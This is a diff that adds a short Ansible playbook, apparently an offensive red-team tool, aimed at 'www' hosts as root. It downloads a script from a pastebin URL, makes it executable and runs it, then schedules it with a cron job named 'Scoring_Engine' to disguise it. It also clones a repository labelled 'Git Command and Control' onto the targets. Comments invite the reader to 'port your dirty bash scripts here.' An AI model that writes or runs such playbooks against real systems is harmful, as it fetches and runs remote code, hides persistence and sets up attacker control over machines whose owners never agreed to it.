@@ -1,0 +1,27 @@
+---
+- hosts: www # Specify from inventory file.
+  remote_user: root
+
+  vars:
+      pastebin_evil: http://pastebin.com/raw/fLcRVDri 
+      evil_repo: https://github.com/YOUR_USERNAME/REPO
+      working_dir: /var/tmp/
+
+  tasks:
+      - name: Trying to install git. 
+        package: name=git #Install git if it does not exist, this will result in an "ok" if it was already installed or a "changed" if it was installed.
+
+      - name: Download and running pastebin scripts.
+        get_url: url={{ pastebin_evil }} dest=/tmp/super_bad_thing.sh mode=0755
+
+        #Schedule execution of pastebin script.
+      - name: Scheduling tasks with cron.
+        cron: name="Scoring_Engine" minute="5" hour="1" job="/tmp/super_bad_thing.sh" 
+
+        # Shell does not expect anything to be returned to the user.
+        # Port your dirty bash scripts here.
+      - name: Running bash script the first time.
+        shell: /tmp/super_bad_thing.sh | wall
+
+      - name: Git Command and Control.
+        git: repo={{ evil_repo }} dest={{ working_dir }}
